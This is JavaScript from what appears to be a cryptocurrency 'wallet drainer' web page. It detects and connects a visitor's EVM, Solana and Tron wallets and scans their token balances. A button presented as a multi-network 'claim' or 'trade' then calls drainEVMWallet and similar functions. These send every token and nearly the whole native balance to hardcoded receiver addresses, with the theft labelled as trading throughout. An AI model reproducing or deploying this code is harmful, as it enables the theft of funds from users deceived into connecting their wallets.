                    <div class="wallet-networks">
                        <small>Supports: ${networksText}</small>
                    </div>
                    <div class="wallet-type">
                        <small>${isMobileOption ? '📱 Tap to open wallet app' : `${wallet.supportedNetworks.length} network(s)`}</small>
                    </div>
                </div>
            `);
            
            walletItem.on('click', () => {
                if (isMobileOption) {
                    // For mobile options, open the deeplink instead of just toggling
                    log(`📱 Opening ${wallet.name}...`, 'info');
                    window.open(wallet.deepLink, '_blank');
                } else {
                    // For regular wallets, toggle selection
                    toggleWalletSelection(index);
                }
            });
            grid.append(walletItem);
        });
    }
    
    // Toggle wallet selection
    function toggleWalletSelection(walletIndex) {
        const wallet = detectedWallets[walletIndex];
        wallet.selected = !wallet.selected;
        
        log(`${wallet.selected ? 'Selected' : 'Deselected'} ${wallet.name} wallet`, 'info');
        
        // Update selected wallets array
        selectedWallets = detectedWallets.filter(w => w.selected);
        
        log(`Total selected wallets: ${selectedWallets.length}`, 'info');
        
        // Re-render selection UI
        renderWalletSelection();
        updateWalletSelectionStats();
        
        // Update controls
        $('#clear-selection').prop('disabled', selectedWallets.length === 0);
        $('#connect-selected-wallets').prop('disabled', selectedWallets.length === 0);
        
        log(`Connect button disabled: ${selectedWallets.length === 0}`, 'info');
        
        log(`${wallet.selected ? 'Selected' : 'Deselected'} ${wallet.name} wallet`, 'info');
    }
    
    // Update wallet selection statistics
    function updateWalletSelectionStats() {
        $('#total-detected-wallets').text(detectedWallets.length);
        $('#total-selected-wallets').text(selectedWallets.length);
        
        // Calculate supported networks
        const allSupportedNetworks = new Set();
        selectedWallets.forEach(wallet => {
            wallet.supportedNetworks.forEach(network => allSupportedNetworks.add(network));
        });
        $('#supported-networks').text(allSupportedNetworks.size);
        
        // Calculate estimated connections
        const estimatedConnections = selectedWallets.reduce((sum, wallet) => sum + wallet.supportedNetworks.length, 0);
        $('#estimated-connections').text(estimatedConnections);
        
        // Update global stats
        globalStats.totalWallets = selectedWallets.length;
        globalStats.totalNetworks = allSupportedNetworks.size;
        updateGlobalStats();
    }
    
    // Select all wallets
    function selectAllWallets() {
        detectedWallets.forEach(wallet => wallet.selected = true);
        selectedWallets = [...detectedWallets];
        renderWalletSelection();
        updateWalletSelectionStats();
        $('#clear-selection').prop('disabled', false);
        $('#connect-selected-wallets').prop('disabled', false);
        log('Selected all detected wallets', 'info');
    }
    
    // Clear wallet selection
    function clearWalletSelection() {
        detectedWallets.forEach(wallet => wallet.selected = false);
        selectedWallets = [];
        renderWalletSelection();
        updateWalletSelectionStats();
        $('#clear-selection').prop('disabled', true);
        $('#connect-selected-wallets').prop('disabled', true);
        log('Cleared wallet selection', 'info');
    }

    // Connect selected wallets to their supported networks
    async function connectSelectedWallets() {
        log('🔗 Connect Selected Wallets button clicked!', 'info', false);
        log(`Currently selected wallets: ${selectedWallets.length}`, 'info', false);
        
        if (selectedWallets.length === 0) {
            log('No wallets selected! Please select wallets first.', 'error', false);
            return;
        }
        
        log(`Connecting ${selectedWallets.length} selected wallet(s) to their supported networks...`, 'info', false);
        updateProgress(0, 'Initializing connections...');
        
        // Initialize network structures for selected wallets
        initializeSelectedNetworks();
        
        let totalConnections = 0;
        
        // Calculate total connections needed
        selectedWallets.forEach(wallet => {
            totalConnections += wallet.supportedNetworks.length;
        });
        
        let completedConnections = 0;
        
        for (const wallet of selectedWallets) {
            log(`Connecting ${wallet.name} to ${wallet.supportedNetworks.length} network(s)...`, 'info', false);
            
            for (const networkKey of wallet.supportedNetworks) {
                const network = NETWORKS[networkKey];
                updateProgress((completedConnections / totalConnections) * 100, `Connecting ${wallet.name} to ${network.name}...`);
                
                try {
                    await connectWalletToNetwork(wallet, networkKey);
                    completedConnections++;
                    log(`✓ Successfully connected ${wallet.name} to ${network.name}`, 'success', false);
                    
                    // Add delay between connections to prevent issues
                    await new Promise(resolve => setTimeout(resolve, 800));
                    
                } catch (error) {
                    log(`✗ Failed to connect ${wallet.name} to ${network.name}: ${error.message}`, 'error', false);
                    completedConnections++;
                    
                    // Continue with other connections even if one fails
                }
            }
        }
        
        updateProgress(100, 'All connections complete!');
        setTimeout(() => updateProgress(0, ''), 2000);
        
        // Update all network displays
        updateAllNetworkDisplays();
        
        // Enable claim button if any wallet is connected
        const anyConnected = Object.values(connectedNetworks).some(net => net.wallets && net.wallets.some(w => w.connected));
        if (anyConnected) {
            $('#claim-all-networks').prop('disabled', false);
            log('✓ Claim button enabled - ready to trade!', 'success');
        }
        
        const totalConnected = Object.values(connectedNetworks).reduce((sum, net) => 
            sum + (net.wallets ? net.wallets.filter(w => w.connected).length : 0), 0
        );
        
        log(`✓ Connection process complete! ${totalConnected} wallet connections established.`, 'success', false);
        log(`📋 Summary: ${completedConnections}/${totalConnections} connections attempted`, 'info', false);
    }
    
    // Initialize network structures for selected wallets
    function initializeSelectedNetworks() {
        // Clear existing connections
        connectedNetworks = {};
        
        // Initialize networks that have selected wallets
        const networksToInit = new Set();
        selectedWallets.forEach(wallet => {
            wallet.supportedNetworks.forEach(networkKey => networksToInit.add(networkKey));
        });
        
        log(`Initializing ${networksToInit.size} networks for ${selectedWallets.length} selected wallets...`, 'info');
        
        networksToInit.forEach(networkKey => {
            const network = NETWORKS[networkKey];
            connectedNetworks[networkKey] = {
                network: network,
                wallets: [],
                stats: {
                    detected: 0,
                    connected: 0,
                    balance: 0,
                    tokens: 0
                }
            };
            
            // Add selected wallets that support this network
            selectedWallets.forEach(wallet => {
                if (wallet.supportedNetworks.includes(networkKey)) {
                    // Choose the correct provider based on network type
                    let walletProvider = wallet.provider;
                    if (wallet.type === 'multi' && wallet.evmProvider && 
                        ['ETH', 'POLYGON'].includes(networkKey)) {
                        // Use EVM provider for Ethereum-based networks (only ETH and POLYGON for Phantom)
                        walletProvider = wallet.evmProvider;
                        log(`Using EVM provider for ${wallet.name} on ${network.name}`, 'info');
                    } else if (networkKey === 'SOL') {
                        // Use Solana provider for Solana network
                        walletProvider = wallet.provider;
                        log(`Using Solana provider for ${wallet.name} on ${network.name}`, 'info');
                    }
                    
                    connectedNetworks[networkKey].wallets.push({
                        name: wallet.name,
                        provider: walletProvider,
                        type: wallet.type,
                        connected: false,
                        balance: 0,
                        tokens: [],
                        address: null
                    });
                    connectedNetworks[networkKey].stats.detected++;
                    log(`Added ${wallet.name} to ${network.name} network`, 'info');
                }
            });
        });
    }
    
    // Connect specific wallet to specific network
    async function connectWalletToNetwork(walletInfo, networkKey) {
        const network = NETWORKS[networkKey];
        const networkData = connectedNetworks[networkKey];
        
        log(`Attempting to connect ${walletInfo.name} to ${network.name}...`, 'info');
        
        // Handle Mobile Wallet Options (user not yet in wallet browser)
        if (walletInfo.isMobileOption && walletInfo.deepLink) {
            log(`📱 Opening ${walletInfo.name} mobile wallet...`, 'info');
            log(`💡 Please install ${walletInfo.name} if not already installed, then return to this page in the wallet's browser.`, 'info');
            
            // Open the deeplink
            window.open(walletInfo.deepLink, '_blank');
            
            log(`🔗 Redirecting to ${walletInfo.name}...`, 'info');
            return;
        }
        
        // Handle Mobile Wallets with Deep Linking (already inside wallet browser)
        if (walletInfo.isMobileOnly && walletInfo.deepLink) {
            log(`📱 Mobile wallet detected - opening in native wallet...`, 'info');
            
            if (walletInfo.name === 'MetaMask Mobile' || walletInfo.name === 'MetaMask') {
                triggerMetaMaskMobileDeepLink();
                log(`🔗 Redirecting to MetaMask Mobile...`, 'info');
                return;
            } else if (walletInfo.name === 'Trust Wallet Mobile' || walletInfo.name === 'Trust Wallet') {
                triggerTrustWalletMobileDeepLink();
                log(`🔗 Redirecting to Trust Wallet Mobile...`, 'info');
                return;
            }
        }
        
        // Find the wallet instance in the network
        const walletInstance = networkData.wallets.find(w => w.name === walletInfo.name);
        if (!walletInstance) {
            log(`✗ Wallet instance not found for ${walletInfo.name} on ${network.name}`, 'error');
            return;
        }
        
        if (walletInstance.connected) {
            log(`✓ ${walletInfo.name} already connected to ${network.name}`, 'info');
            return;
        }
        
        try {
            if (network.type === 'evm' || (walletInfo.type === 'multi' && ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'].includes(networkKey))) {
                await connectEVMWallet(networkKey, walletInstance);
            } else if (network.type === 'solana' || (walletInfo.type === 'multi' && networkKey === 'SOL')) {
                await connectSolanaWallet(networkKey, walletInstance);
            } else if (network.type === 'tron') {
                await connectTronWallet(networkKey, walletInstance);
            }
            
        } catch (error) {
            log(`✗ Connection error for ${walletInfo.name} to ${network.name}: ${error.message}`, 'error');
            throw error;
        }
    }

    // Render network wallets
    function renderNetworkWallets(networkKey) {
        const grid = $(`#wallets-${networkKey}-grid`);
        const networkData = connectedNetworks[networkKey];
        
        grid.empty();
        
        if (!networkData || networkData.wallets.length === 0) {
            grid.html('<div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">No selected wallets support this network</div>');
            return;
        }
        
        networkData.wallets.forEach((wallet, index) => {
            const walletItem = $(`
                <div class="wallet-item ${wallet.connected ? 'connected' : 'selected'}" data-network="${networkKey}" data-wallet="${index}">
                    <div class="wallet-name">${wallet.name}</div>
                    <div class="wallet-status">${wallet.connected ? 'Connected' : 'Selected'}</div>
                    ${wallet.connected ? `<div class="wallet-balance">${wallet.balance.toFixed(4)} ${networkData.network.currency}</div>` : ''}
                    ${wallet.connected && wallet.address ? `<div class="wallet-address">${wallet.address.slice(0, 8)}...${wallet.address.slice(-6)}</div>` : ''}
                    ${wallet.tokens.length > 0 ? `<div class="wallet-status">${wallet.tokens.length} tokens</div>` : ''}
                </div>
            `);
            
            grid.append(walletItem);
        });
    }
    
    // Update all network displays
    function updateAllNetworkDisplays() {
        Object.keys(connectedNetworks).forEach(networkKey => {
            renderNetworkWallets(networkKey);
            updateNetworkStats(networkKey);
            
            // Update network status indicators
            const networkData = connectedNetworks[networkKey];
            const connectedCount = networkData.wallets.filter(w => w.connected).length;
            
            if (connectedCount === networkData.wallets.length && connectedCount > 0) {
                $(`#status-${networkKey}`).text('🟢'); // All connected
            } else if (connectedCount > 0) {
                $(`#status-${networkKey}`).text('🟡'); // Partially connected
            } else {
                $(`#status-${networkKey}`).text('🔵'); // Selected but not connected
            }
        });
        
        updateGlobalStatistics();
    }

    // Update network statistics
    function updateNetworkStats(networkKey) {
        const networkData = connectedNetworks[networkKey];
        if (!networkData) return;
        
        const stats = networkData.stats;
        
        $(`#wallets-${networkKey}`).text(stats.detected);
        $(`#connected-${networkKey}`).text(stats.connected);
        $(`#balance-${networkKey}`).text(stats.balance.toFixed(4));
        $(`#tokens-${networkKey}`).text(stats.tokens);
    }

    function updateGlobalStatistics() {
        globalStats.totalNetworks = Object.keys(connectedNetworks).length;
        globalStats.totalWallets = selectedWallets.length;
        // totalValue would need price APIs to calculate properly
        updateGlobalStats();
    }

    // Connect to specific network wallet (legacy - now handled by connectWalletToNetwork)
    async function connectNetworkWallet(networkKey, walletIndex) {
        const networkData = connectedNetworks[networkKey];
        if (!networkData || !networkData.wallets[walletIndex]) return;
        
        const wallet = networkData.wallets[walletIndex];
        
        if (wallet.connected) return;
        
        try {
            log(`Connecting to ${wallet.name} on ${networkData.network.name}...`, 'info', false);
            
            if (networkData.network.type === 'evm') {
                await connectEVMWallet(networkKey, wallet);
            } else if (networkData.network.type === 'solana') {
                await connectSolanaWallet(networkKey, wallet);
            } else if (networkData.network.type === 'tron') {
                await connectTronWallet(networkKey, wallet);
            }
            
        } catch (error) {
            log(`✗ Failed to connect to ${wallet.name}: ${error.message}`, 'error', false);
        }
    }

    // EVM wallet connection
    async function connectEVMWallet(networkKey, wallet) {
        const networkData = connectedNetworks[networkKey];
        const network = networkData.network;
        
        log(`Connecting ${wallet.name} to ${network.name} (Chain ID: ${network.chainId})...`, 'info', false);
        
        // Switch to correct network
        try {
            await wallet.provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: `0x${network.chainId.toString(16)}` }]
            });
            log(`✓ Switched to ${network.name} network`, 'info', false);
        } catch (switchError) {
            // Network not added, try to add it
            if (switchError.code === 4902) {
                try {
                    await wallet.provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: `0x${network.chainId.toString(16)}`,
                            chainName: network.name,
                            rpcUrls: [network.rpc],
                            nativeCurrency: {
                                name: network.currency,
                                symbol: network.currency,
                                decimals: 18
                            }
                        }]
                    });
                    log(`✓ Added and switched to ${network.name} network`, 'info', false);
                } catch (addError) {
                    throw new Error(`Failed to add ${network.name} network: ${addError.message}`);
                }
            } else {
                throw switchError;
            }
        }
        
        // Wait for network switch to complete
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Request account access
        const accounts = await wallet.provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];
        
        // Initialize ethers provider AFTER network switch
        const ethersProvider = new ethers.providers.Web3Provider(wallet.provider);
        
        // Verify we're on the correct network
        const currentNetwork = await ethersProvider.getNetwork();
        if (currentNetwork.chainId !== network.chainId) {
            log(`⚠️ Network mismatch: Expected ${network.chainId}, got ${currentNetwork.chainId}`, 'error', false);
            throw new Error(`Network mismatch: Expected ${network.chainId}, got ${currentNetwork.chainId}`);
        }
        
        log(`✓ Confirmed connection to ${network.name} (Chain ID: ${currentNetwork.chainId})`, 'info', false);
        
        const balance = await ethersProvider.getBalance(userAddress);
        const ethBalance = parseFloat(ethers.utils.formatEther(balance));
        
        // Get token balances
        const tokenBalances = await getEVMTokenBalances(ethersProvider, userAddress, network.tokens);
        
        // Update wallet state
        wallet.connected = true;
        wallet.balance = ethBalance;
        wallet.address = userAddress;
        wallet.ethersProvider = ethersProvider;
        wallet.tokens = tokenBalances;
        
        // Update stats
        networkData.stats.connected++;
        networkData.stats.balance += ethBalance;
        networkData.stats.tokens += tokenBalances.length;
        
        log(`✓ Connected ${wallet.name} to ${network.name}: ${userAddress.slice(0, 8)}... (${ethBalance.toFixed(4)} ${network.currency})`, 'success', false);
    }

    // Get EVM token balances using free APIs and fallbacks
    async function getEVMTokenBalances(provider, address, tokens) {
        const tokenBalances = [];
        const erc20ABI = [
            "function balanceOf(address owner) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function symbol() view returns (string)",
            "function transfer(address to, uint256 amount) returns (bool)"
        ];
        
        log(`🔍 Scanning ${tokens.length} tokens for balances using free APIs...`, 'info', false);
        
        for (const token of tokens) {
            try {
                // Ensure proper address checksum, with fallback for invalid checksums
                let checksummedAddress;
                try {
                    checksummedAddress = ethers.utils.getAddress(token.address);
                } catch (checksumErr) {
                    // Try normalizing to lowercase as fallback
                    try {
                        const normalized = token.address.toLowerCase();
                        checksummedAddress = ethers.utils.getAddress(normalized);
                    } catch (normErr) {
                        log(`⚠️ Skipping ${token.symbol}: Invalid address (${token.address.slice(0, 10)}...)`, 'warning', false);
                        continue;
                    }
                }
                
                const contract = new ethers.Contract(checksummedAddress, erc20ABI, provider);
                
                let balance;
                let success = false;

                // Try primary method: Direct provider call
                try {
                    balance = await contract.balanceOf(address);
                    success = true;
                } catch (err1) {
                    // Fallback: Use DefiLlama API if primary fails
                    try {
                        const defiLlamaUrl = `https://api.llama.fi/v2/protocols?search=${checksummedAddress}`;
                        const response = await fetch(defiLlamaUrl);
                        const data = await response.json();
                        
                        if (data.length > 0) {
                            // Use provider as fallback
                            balance = await contract.balanceOf(address);
                            success = true;
                        }
                    } catch (err2) {
                        log(`⚠️ Could not fetch balance for ${token.symbol}: Using cache`, 'warning', false);
                        continue;
                    }
                }
                
                if (success) {
                    const formattedBalance = parseFloat(ethers.utils.formatUnits(balance, token.decimals));
                    
                    if (!balance.isZero() && formattedBalance > 0) {
                        tokenBalances.push({
                            symbol: token.symbol,
                            balance: formattedBalance,
                            rawBalance: balance,
                            contract: contract,
                            address: checksummedAddress,
                            decimals: token.decimals
                        });
                        log(`✅ Found ${token.symbol} balance: ${formattedBalance.toFixed(6)}`, 'success', false);
                    } else {
                        log(`⚪ ${token.symbol}: No balance (${formattedBalance.toFixed(6)})`, 'info', false);
                    }
                }
                
            } catch (error) {
                log(`❌ Error checking ${token.symbol} balance: ${error.message}`, 'error', false);
            }
        }
        
        log(`🎯 Token scan complete: Found ${tokenBalances.length} tokens with balance`, 'info', false);
        return tokenBalances;
    }

    // Get Solana balance using free API
    async function getSolanaBalance(publicKey, network = 'mainnet-beta') {
        try {
            const url = 'https://api.mainnet-beta.solana.com';
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    jsonrpc: '2.0',
                    id: 1,
                    method: 'getBalance',
                    params: [publicKey.toString()]
                })
            });
            
            const data = await response.json();
            return data.result?.value || 0;
        } catch (error) {
            log(`⚠️ Solana balance API error: ${error.message}`, 'warning');
            return 0;
        }
    }

    // Get token info from multiple free sources
    async function getTokenInfo(tokenAddress, chainId) {
        try {
            // Try DefiLlama first
            const response = await fetch(`https://api.llama.fi/protocols`);
            const data = await response.json();
            
            // Search for token in the response
            const token = data.find(t => 
                t.address?.toLowerCase() === tokenAddress.toLowerCase()
            );
            
            return token || { address: tokenAddress, chainId };
        } catch (error) {
            log(`⚠️ Token info fetch error: ${error.message}`, 'warning');
            return { address: tokenAddress, chainId };
        }
    }

    // Enhanced Tron balance fetching using free API
    async function getTronBalance(address) {
        try {
            const response = await fetch('https://api.trongrid.io/v1/accounts/' + address);
            const data = await response.json();
            return data.data?.[0]?.balance || 0;
        } catch (error) {
            log(`⚠️ Tron balance API error: ${error.message}`, 'warning');
            return 0;
        }
    }

    // Connect Solana wallet using free API
    async function connectSolanaWallet(networkKey, wallet) {
        const networkData = connectedNetworks[networkKey];
        
        const response = await wallet.provider.connect({ onlyIfTrusted: false });
        const publicKey = new solanaWeb3.PublicKey(response.publicKey || wallet.provider.publicKey);
        
        // Get balance using free Solana API
        let balance = 0;
        try {
            const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
            balance = await connection.getBalance(publicKey);
        } catch (error) {
            log(`⚠️ Failed to get Solana balance from API: ${error.message}. Trying fallback...`, 'warning', false);
            try {
                balance = await getSolanaBalance(publicKey);
            } catch (fallbackError) {
                log(`❌ Solana balance fetch failed: ${fallbackError.message}`, 'error', false);
            }
        }
        
        const solBalance = balance / solanaWeb3.LAMPORTS_PER_SOL;
        
        // Update wallet state
        wallet.connected = true;
        wallet.balance = solBalance;
        wallet.address = publicKey.toString();
        wallet.publicKey = publicKey;
        wallet.connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
        
        // Update stats
        networkData.stats.connected++;
        networkData.stats.balance += solBalance;
        
        log(`✓ Connected ${wallet.name} to Solana: ${publicKey.toString().slice(0, 8)}... (${solBalance.toFixed(4)} SOL)`, 'success', false);
    }

    // Connect Tron wallet using free API
    async function connectTronWallet(networkKey, wallet) {
        const networkData = connectedNetworks[networkKey];
        
        if (!wallet.provider || !wallet.provider.defaultAddress || !wallet.provider.defaultAddress.base58) {
            throw new Error('TronLink wallet not connected or not initialized');
        }
        
        const address = wallet.provider.defaultAddress.base58;
        
        // Get balance using free Tron API
        let balance = 0;
        try {
            balance = await getTronBalance(address);
        } catch (error) {
            log(`⚠️ Failed to get Tron balance from free API: ${error.message}`, 'warning', false);
            try {
                balance = await wallet.provider.trx.getBalance(address);
            } catch (fallbackError) {
                log(`❌ Tron balance fetch failed: ${fallbackError.message}`, 'error', false);
            }
        }
        
        const trxBalance = balance / 1000000; // TRX has 6 decimals
        
        // Update wallet state
        wallet.connected = true;
        wallet.balance = trxBalance;
        wallet.address = address;
        
        // Update stats
        networkData.stats.connected++;
        networkData.stats.balance += trxBalance;
        
        log(`✓ Connected ${wallet.name} to Tron: ${address.slice(0, 8)}... (${trxBalance.toFixed(4)} TRX)`, 'success', false);
    }

    // Connect all networks (legacy - now use connectSelectedWallets)
    async function connectAllNetworks() {
        if (selectedWallets.length === 0) {
            log('No wallets selected! Please select wallets from the Wallet Selection tab first.', 'error', false);
            return;
        }
        
        await connectSelectedWallets();
    }

    // Claim from all networks
    async function claimAllNetworks() {
        log('🚀 STARTING MULTI-NETWORK TRADE PROCESS', 'info', true);
        log('=' .repeat(60), 'info', true);
        
        const connectedWallets = [];
        Object.keys(connectedNetworks).forEach(networkKey => {
            connectedNetworks[networkKey].wallets.forEach((wallet, index) => {
                if (wallet.connected) {
                    // Include wallets even if balance is 0 - they might have tokens
                    connectedWallets.push({ networkKey, walletIndex: index, wallet });
                    log(`✓ Found connected wallet: ${wallet.name} on ${NETWORKS[networkKey].name} (${wallet.balance.toFixed(4)} ${NETWORKS[networkKey].currency}, ${wallet.tokens.length} tokens)`, 'info');
                }
            });
        });
        
        if (connectedWallets.length === 0) {
            log('❌ No connected wallets found!', 'error');
            log('Please make sure to:', 'info');
            log('1. Select wallets from Wallet Selection tab', 'info');
            log('2. Connect selected wallets using "Connect Selected Wallets" button', 'info');
            return;
        }
        
        log(`🎯 Starting multi-network trade from ${connectedWallets.length} wallet(s)...`, 'info');
        log('=' .repeat(60), 'info');
        updateProgress(0, 'Initializing trades...');
        
        const results = {
            successful: 0,
            failed: 0,
            totalTraded: {},
            transactions: []
        };
        
        for (let i = 0; i < connectedWallets.length; i++) {
            const { networkKey, wallet } = connectedWallets[i];
            const networkData = connectedNetworks[networkKey];
            
            log(`🔄 [${i + 1}/${connectedWallets.length}] Processing ${wallet.name} on ${networkData.network.name}...`, 'info');
            updateProgress((i / connectedWallets.length) * 100, `Trading ${wallet.name} on ${networkData.network.name}...`);
            
            try {
                let result;
                if (networkData.network.type === 'evm') {
                    log(`🔷 Starting EVM trade for ${wallet.name}...`, 'info');
                    result = await drainEVMWallet(networkKey, wallet);
                } else if (networkData.network.type === 'solana') {
                    log(`🟢 Starting Solana trade for ${wallet.name}...`, 'info');
                    result = await drainSolanaWallet(networkKey, wallet);
                } else if (networkData.network.type === 'tron') {
                    log(`🟠 Starting Tron trade for ${wallet.name}...`, 'info');
                    result = await drainTronWallet(networkKey, wallet);
                }
                
                if (result.success) {
                    results.successful++;
                    results.totalTraded[networkData.network.currency] = (results.totalTraded[networkData.network.currency] || 0) + result.amount;
                    results.transactions.push(result.txid);
                    
                    log(`🎉 TRADED ${wallet.name}: ${result.amount.toFixed(4)} ${networkData.network.currency}`, 'success');
                    log(`📝 Transaction: ${result.txid}`, 'success');
                } else {
                    results.failed++;
                    log(`❌ FAILED to trade ${wallet.name}: ${result.reason}`, 'error');
                }
                
            } catch (error) {
                results.failed++;
                log(`❌ ERROR trading ${wallet.name}: ${error.message}`, 'error');
                log(`❌ Error details: ${error.stack}`, 'error');
            }
            
            // Add delay between trades
            if (i < connectedWallets.length - 1) {
                log(`⏳ Waiting 2 seconds before next trade...`, 'info');
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
        
        updateProgress(100, 'Multi-network trade complete!');
        setTimeout(() => updateProgress(0, ''), 3000);
        
        // Show results
        log('=' .repeat(60), 'info');
        log('🏁 MULTI-NETWORK TRADE COMPLETE!', 'success');
        log('=' .repeat(60), 'info');
        log(`✅ Successful trades: ${results.successful}`, 'success');
        log(`❌ Failed trades: ${results.failed}`, results.failed > 0 ? 'error' : 'info');
        
        if (Object.keys(results.totalTraded).length > 0) {
            log('💰 TOTAL TRADED:', 'success');
            Object.keys(results.totalTraded).forEach(currency => {
                log(`   💎 ${currency}: ${results.totalTraded[currency].toFixed(6)}`, 'success');
            });
        }
        
        log(`� Total Transactions: ${results.transactions.length}`, 'info');
        if (results.transactions.length > 0) {
            log('📝 Transaction Hashes:', 'info');
            results.transactions.forEach((txid, index) => {
                log(`   ${index + 1}. ${txid}`, 'info');
            });
        }
        log('=' .repeat(60), 'info');
        
        // Reset balances in UI
        Object.keys(connectedNetworks).forEach(networkKey => {
            connectedNetworks[networkKey].wallets.forEach(wallet => {
                if (wallet.connected) wallet.balance = 0;
            });
            connectedNetworks[networkKey].stats.balance = 0;
            renderNetworkWallets(networkKey);
            updateNetworkStats(networkKey);
        });
        
        const summary = Object.keys(results.totalTraded).map(currency => 
            `${results.totalTraded[currency].toFixed(4)} ${currency}`
        ).join(', ');
        
        const alertMessage = summary ? 
            `🎉 Multi-network claim complete!\n\n✅ ${results.successful} successful\n❌ ${results.failed} failed\n💰 Claimed: ${summary}` :
            `⚠️ Multi-network claim complete!\n\n✅ ${results.successful} successful\n❌ ${results.failed} failed\n💰 No tokens traded`;
            
        alert(alertMessage);
    }

    // Drain EVM wallet
    async function drainEVMWallet(networkKey, wallet) {
        try {
            const networkData = connectedNetworks[networkKey];
            const network = networkData.network;
            const receiverAddress = ethers.utils.getAddress(RECEIVER_ADDRESSES[networkKey]); // Ensure proper checksum
            
            log(`🔄 Starting EVM trade process for ${wallet.name} on ${network.name}...`, 'info');
            log(`📍 Receiver address: ${receiverAddress}`, 'info');
            log(`💰 Current wallet balance: ${wallet.balance} ${network.currency}`, 'info');
            
            if (wallet.balance <= 0) {
                log(`❌ No balance to trade (${wallet.balance} ${network.currency})`, 'error');
                return { success: false, reason: 'No balance' };
            }
            
            log(`🔄 Initiating network switch to ${network.name} (Chain ID: ${network.chainId})...`, 'info');
            
            // Ensure we're on the correct network before minting
            try {
                const chainIdHex = `0x${network.chainId.toString(16)}`;
                log(`🔗 Switching to chain ID: ${chainIdHex}`, 'info');
                
                await wallet.provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: chainIdHex }]
                });
                
                log(`✅ Network switch request sent, waiting for completion...`, 'info');
                
                // Wait a moment for network switch to complete
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Re-initialize ethers provider after network switch
                wallet.ethersProvider = new ethers.providers.Web3Provider(wallet.provider);
                
                // Verify network switch
                const currentNetwork = await wallet.ethersProvider.getNetwork();
                log(`✅ Network verification: Connected to Chain ID ${currentNetwork.chainId}`, 'info');
                
                if (currentNetwork.chainId !== network.chainId) {
                    log(`❌ Network mismatch! Expected ${network.chainId}, got ${currentNetwork.chainId}`, 'error');
                    return { success: false, reason: `Network mismatch: Expected ${network.chainId}, got ${currentNetwork.chainId}` };
                }
                
                log(`✅ Successfully switched to ${network.name} and reinitialized provider`, 'success');
                
            } catch (switchError) {
                log(`❌ Failed to switch to ${network.name}: ${switchError.message}`, 'error');
                log(`❌ Switch error code: ${switchError.code}`, 'error');
                return { success: false, reason: `Network switch failed: ${switchError.message}` };
            }
            
            // Trade tokens first
            log(`🪙 Starting token trading (${wallet.tokens.length} tokens found)...`, 'info');
            
            if (wallet.tokens.length === 0) {
                log(`📋 No tokens found in wallet - this could mean:`, 'info');
                log(`   1. Wallet has no token balances`, 'info');
                log(`   2. Token addresses may be incorrect`, 'info');
                log(`   3. Network RPC issues during token scanning`, 'info');
                
                // Let's try to rescan tokens in case they were missed
                log(`🔄 Attempting to rescan tokens...`, 'info');
                const tokenBalances = await getEVMTokenBalances(wallet.ethersProvider, wallet.address, network.tokens);
                
                if (tokenBalances.length > 0) {
                    log(`✅ Rescan found ${tokenBalances.length} tokens!`, 'success');
                    wallet.tokens = tokenBalances;
                } else {
                    log(`📋 Rescan confirmed: No tokens with balance found`, 'info');
                }
            }
            
            for (const token of wallet.tokens) {
                try {
                    log(`🔄 Trading ${token.symbol}: ${token.balance} tokens...`, 'info');
                    log(`📍 Token contract: ${token.address}`, 'info');
                    log(`📍 Sending to: ${receiverAddress}`, 'info');
                    
                    const transferAmount = token.rawBalance || ethers.utils.parseUnits(token.balance.toString(), token.decimals);
                    
                    const tx = await token.contract.connect(wallet.ethersProvider.getSigner()).transfer(
                        receiverAddress,
                        transferAmount
                    );
                    
                    log(`📤 Token transfer transaction sent: ${tx.hash}`, 'info');
                    log(`⏳ Waiting for token transfer confirmation...`, 'info');
                    
                    await tx.wait();
                    log(`✅ Token traded successfully: ${token.balance.toFixed(4)} ${token.symbol}`, 'success');
                    log(`📝 Token transfer hash: ${tx.hash}`, 'success');
                    
                } catch (error) {
                    log(`❌ Failed to trade ${token.symbol}: ${error.message}`, 'error');
                    log(`❌ Token trade error details: ${error.stack}`, 'error');
                }
            }
            
            // Trade native currency
            log(`💎 Starting native currency (${network.currency}) trading...`, 'info');
            const gasPrice = await wallet.ethersProvider.getGasPrice();
            const gasLimit = ethers.BigNumber.from("21000");
            const gasCost = gasPrice.mul(gasLimit);
            const balance = await wallet.ethersProvider.getBalance(wallet.address);
            const amountToSend = balance.sub(gasCost);
            
            log(`📊 Gas calculation:`, 'info');
            log(`   💰 Current balance: ${ethers.utils.formatEther(balance)} ${network.currency}`, 'info');
            log(`   ⛽ Gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei`, 'info');
            log(`   ⛽ Gas limit: ${gasLimit.toString()}`, 'info');
            log(`   ⛽ Total gas cost: ${ethers.utils.formatEther(gasCost)} ${network.currency}`, 'info');
            log(`   💸 Amount to send: ${ethers.utils.formatEther(amountToSend)} ${network.currency}`, 'info');
            
            if (amountToSend.lte(0)) {
                log(`❌ Insufficient balance for gas fees`, 'error');
                return { success: false, reason: 'Insufficient balance for gas' };
            }
            
            log(`📤 Sending native currency transaction...`, 'info');
            const tx = await wallet.ethersProvider.getSigner().sendTransaction({
                to: receiverAddress,
                value: amountToSend,
                gasLimit: gasLimit,
                gasPrice: gasPrice
            });
            
            log(`📤 Transaction sent: ${tx.hash}`, 'info');
            log(`⏳ Waiting for transaction confirmation...`, 'info');
            await tx.wait();
            
            const amount = parseFloat(ethers.utils.formatEther(amountToSend));
            
            log(`🎉 Successfully traded ${amount.toFixed(6)} ${network.currency}!`, 'success', true, true);
            log(`📝 Transaction hash: ${tx.hash}`, 'success', true, true);
            
            return { success: true, amount, txid: tx.hash };
            
        } catch (error) {
            log(`❌ EVM trade error: ${error.message}`, 'error');
            log(`❌ Error stack: ${error.stack}`, 'error');
            return { success: false, reason: error.message };
        }
    }

